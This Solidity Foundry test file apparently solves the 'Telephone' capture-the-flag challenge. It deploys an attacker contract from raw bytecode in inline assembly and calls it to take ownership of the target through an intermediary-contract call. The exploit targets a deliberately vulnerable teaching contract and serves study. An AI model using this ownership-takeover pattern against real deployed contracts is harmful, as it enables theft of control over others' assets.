pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Telephone.sol";

contract AttackTelephone {
    function pwn(address phone) public {
        Telephone(phone).changeOwner(msg.sender);
    }
}

contract ASMTelephone is Test {
    address public attacker = address(420);
    Telephone public target;

    bytes bytecode =
        hex"608060405234801561001057600080fd5b5060fc8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c806302c6591d14602d575b600080fd5b603c60383660046098565b603e565b005b60405163a6f9dae160e01b81523360048201526001600160a01b0382169063a6f9dae190602401600060405180830381600087803b158015607e57600080fd5b505af11580156091573d6000803e3d6000fd5b5050505050565b60006020828403121560a957600080fd5b81356001600160a01b038116811460bf57600080fd5b939250505056fea264697066735822122039052c70547a1212874a04acb4512219bc124fee770645b889898631a93180de64736f6c63430008110033";

    function setUp() public {
        target = new Telephone();
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testASMAttackTelephone() public attack {
        assembly {
            // init fmp
            let ptr := mload(0x40)

            // we know there are more than 32 bytes so the data in the slot is the length
            // we need to divide by 2 to account 2 hex characters per byte
            let bytecode_length := div(sload(bytecode.slot), 2)

            // we can get the start of the storage location of the data by hashing the slot
            mstore(ptr, bytecode.slot)
            let bytecode_start := keccak256(ptr, 0x20)
            // update the pointer after the hashed value
            ptr := add(ptr, 0x20)

            // whole slots used by our dynamic bytearray are the array length / 32
            let slots := div(bytecode_length, 0x20)

            // we also add 1 for a partial slot if needed
            // this would be the case if slots (from integer division) * 32 bytes == bytecode_length
            // indicating no remainders
            if not(eq(mul(0x20, slots), bytecode_length)) {
                slots := add(slots, 1)
            }

            // begin the loop, saving the start location of the data in memory
            let startPtr := ptr
            for {
                let i := 0
            } lt(i, slots) {
                i := add(i, 1)
            } {
                // grab the data from the adjacent slot
                let data := sload(add(bytecode_start, i))
                // save the data
                mstore(ptr, data)
                // each time we load into memory, increment the pointer by 0x20 bytes
                ptr := add(ptr, 0x20)
            }

            // we have now loaded the full init + runtime code to memory
            // we can pass the memory start offset and length to the create opcode
            // which will create a new sub context and return us the address where the init bytecode is deployed
            let attackContract := create(0, startPtr, bytecode_length)

            // now we just need to call the function using the signature
            // store the selector for "pwn(address)" at the current fmp
            // see previous challenges for how to fetch this without a magic number
            mstore(ptr, shl(224, 0x02c6591d))
            // just after the 4byte selector add the target address
            mstore(add(ptr, 0x4), sload(target.slot))

            let success := call(
                gas(),
                attackContract,
                0,
                ptr, // start reading from our ptr
                add(0x4, 0x20), // args length - selector (bytes4) + data (bytes32)
                0,
                0
            )

            // validate success
            if eq(success, 0) {
                revert(0, 0)
            }
        }

        // check success
        assertEq(target.owner(), attacker);
    }
}
